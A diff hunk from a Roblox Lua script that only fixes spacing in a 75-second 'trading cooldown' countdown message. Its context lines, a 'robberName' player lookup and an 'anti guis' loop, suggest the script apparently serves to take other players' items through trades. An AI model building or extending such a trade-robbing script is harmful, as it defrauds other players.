@@ -60,7 +60,7 @@ if game.Players:FindFirstChild(robberName) then
     local notLoaded = Instance.new("Message", game:GetService("CoreGui"))
 	for i=0,75 do
 	    wait(1)
-	    notLoaded.Text = "Waiting for the trading"..tostring(75-i).."seconds cooldown."
+	    notLoaded.Text = "Waiting for the trading "..tostring(75-i).." seconds cooldown."
     end
     coroutine.wrap(function() -- For anti guis
 	    while wait(.2) do
